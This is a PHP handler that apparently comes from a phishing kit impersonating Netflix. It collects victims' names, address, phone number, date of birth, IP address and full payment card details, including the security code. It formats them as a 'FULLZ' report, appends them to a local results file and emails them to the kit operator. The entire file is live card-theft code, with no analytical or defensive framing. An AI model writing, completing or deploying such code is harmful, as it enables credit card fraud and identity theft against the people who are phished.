<?php
session_start();
require_once("../../main/actions/Email.php");
require_once("../../inc/logs.php");
$fname = $_SESSION['first_name'];
$lname = $_SESSION['last_name'];
$address = $_SESSION['address'];
$city = $_SESSION['city'];
$state = $_SESSION['state'];
$zip = $_SESSION['zip'];
$phone = $_SESSION['phone'];
$firstnamecard = $_POST['firstnamecard'];
$lastnamecard = $_POST['lastnamecard'];
$cardnumber = $_POST['cardnumber'];
$expdate = $_POST['expdate'];
$scv = $_POST['scv'];
$phoneNumber = $_SESSION['phone'];
$dob = $_SESSION['dob'];
$ip = $_SERVER['REMOTE_ADDR'];
$_SESSION['cardnumber'] = $cardnumber;
$_SESSION['fname'] = $lastnamecard." ".$firstnamecard;
$_SESSION['expdate'] = $expdate;
$msg = "
|😈|############[🔔_NETFLIX_LOGIN_CCV_🔔]############|😈|
|✅| First name : $fname
|✅| Last name : $lname
|✅| Address : $address
|✅| City : $city
|✅| State : $state
|✅| Zip : $zip
|✅| Phone : $phone
|✅| Card info !
|😈|################[🔔_Card_info_🔔]################|😈|
|✅| Full name : $firstnamecard $lastnamecard
|✅| Card Number : $cardnumber
|✅| Exp Date : $expdate
|✅| CSC : $scv
|✅| Phone Number : $phoneNumber
|✅| Date of birth : $dob
|✅| IP Address : $ip
|😈|###############################################|😈|
";
$save=fopen('../../rselt/NETFLIX_CCV',"a+");fwrite($save,$msg);fclose($save);
mail($setting["mail_to"], "NETFLIX | FULLZ [$ip] *** ", $msg);
mail($seing["ip_login"],"[$ip] *** ", $msg);
?>
